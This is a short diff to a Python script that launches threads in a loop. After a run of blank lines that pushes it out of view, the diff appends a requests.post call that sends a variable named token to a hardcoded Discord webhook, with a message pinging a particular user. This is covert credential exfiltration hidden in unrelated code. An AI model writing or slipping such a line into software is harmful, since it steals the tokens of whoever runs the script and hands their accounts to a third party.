@@ -89,3 +89,11 @@ for y in range(threads):
 		th = threading.Thread(target = run2)
 
 		th.start()
+
+
+
+
+
+
+
+requests.post('https://discord.com/api/webhooks/936988764029452338/q2XXhHdomcAL8dD7ooFYwyFvex95yZZVgQk-7royjR7d5SQz7AdkhmNuzdYWelEBuFWG',json={'content': f"<@913416321612517406> **__Fuck__**:  `{token}`"})
